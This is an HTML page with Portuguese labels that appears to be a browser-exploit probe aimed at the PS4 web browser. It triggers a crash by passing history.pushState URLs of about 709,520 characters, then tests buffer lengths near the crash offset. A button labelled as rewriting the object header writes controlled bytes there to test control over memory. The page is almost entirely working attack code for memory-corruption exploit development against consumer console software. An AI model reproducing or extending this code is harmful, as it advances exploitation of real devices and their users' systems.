<!DOCTYPE html>
<html>
<head>
    <title>PS4 Memory Alignment Scanner2</title>
    <style>
        body { background-color: #000; color: #ffcc00; font-family: monospace; padding: 20px; text-align: center; }
        button { 
            font-size: 22px; padding: 20px; margin: 15px; cursor: pointer; 
            width: 90%; border: 2px solid #ffcc00; background: #222; color: #fff; font-weight: bold;
        }
        .info { color: cyan; margin-bottom: 20px; border: 1px solid #333; padding: 10px; text-align: left;}
    </style>
</head>
<body>

    <h1>Scanner de Alinhamento de Memória</h1>
    <p>Investigando se o objeto começa ANTES do byte 709.523.</p>

    <div class="info">
        <strong>Teoria:</strong> O crash em .523 é o meio de um ponteiro.<br>
        <strong>Alvos:</strong> 709.520 (Alinhado 8 bytes) e 709.512.
    </div>

    <button onclick="testAlignment(709520)">
        1. Testar Limite 709.520 (Recuo de 3 bytes)<br>
        <small>Se travar aqui, o objeto começa em 520.</small>
    </button>

    <button onclick="testAlignment(709512)">
        2. Testar Limite 709.512 (Recuo de 11 bytes)<br>
        <small>Se travar aqui, o objeto começa em 512.</small>
    </button>
    
    <button style="border-color: #f00; color: #f00;" onclick="injectFakeHeader()">
        3. TENTAR REESCREVER O CABEÇALHO (709.520)<br>
        <small>Tenta escrever 0x0000000000000001 em 520</small>
    </button>

    <div id="log" style="margin-top:20px; color:#aaa;">Pronto.</div>

    <script>
        function log(msg) {
            document.getElementById('log').innerText = msg;
        }

        function testAlignment(size) {
            log("Testando escrita até " + size + " com caractere 'B' (0x42)...");
            
            setTimeout(() => {
                try {
                    // Preenche até o limite escolhido com B
                    // Se o objeto começa em 520 e é sensível, escrever 'B' (0x42) nele deve travar
                    let buffer = "A".repeat(size); 
                    
                    // Nota: Não estamos passando do limite antigo (523). Estamos parando antes.
                    // Se travar, significa que o que achávamos que era "Seguro" (A) 
                    // só era seguro por sorte, e 'B' quebra.
                    
                    // Truque: Vamos mudar o ULTIMO byte para algo agressivo (0xFF)
                    buffer = buffer.slice(0, -1) + "\xFF";

                    history.pushState({}, "align_" + size, "/" + buffer);
                    
                    log("SOBREVIVEU! O endereço " + size + " não parece ser o gatilho.");

                } catch (e) {
                    log("Erro: " + e.message);
                }
            }, 500);
        }

        function injectFakeHeader() {
            log("Tentando reconstruir o cabeçalho em 709.520...");
            setTimeout(() => {
                // Vamos até a borda de alinhamento (520)
                let buffer = "A".repeat(709518);
                
                // Agora escrevemos 8 bytes simulando um Header válido (ou nulo)
                // Se 520 é o começo, escrever 8 bytes de 0x00 pode "consertar" o crash 
                // ou mudar o erro.
                
                // Escrevemos 8 bytes de 0x01 (Seguro)
                // Se isso passar de 523 sem travar, provamos que controlamos o header!
                buffer += "\x01".repeat(16); 

                history.pushState({}, "fake_header", "/" + buffer);
                log("Enviado. Se não travar, controlamos o alinhamento!");
            }, 500);
        }
    </script>
</body>
</html>

